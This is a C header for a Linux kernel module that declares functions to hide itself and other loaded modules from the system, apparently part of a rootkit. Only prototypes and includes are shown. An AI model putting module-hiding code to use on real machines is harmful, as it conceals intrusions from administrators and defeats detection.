#ifndef HIDEMODULE_H
#define HIDEMODULE_H

#include <linux/moduleloader.h>
#include <linux/module.h>
#include <linux/unistd.h>
#include <linux/delay.h>
#include <linux/async.h>
#include <linux/kmemleak.h>
#include <linux/kthread.h>
#include <linux/kobject.h>
#include "include.h"

#include <linux/vmalloc.h>
/* If this is set, the section belongs in the init part of the module */
#define INIT_OFFSET_MASK (1UL << (BITS_PER_LONG-1))


void hide_this_module(void);
void hide_module(struct module* mod);
int unload_thread(void *vmod);
void unload(void);
void show_module(void);

#endif
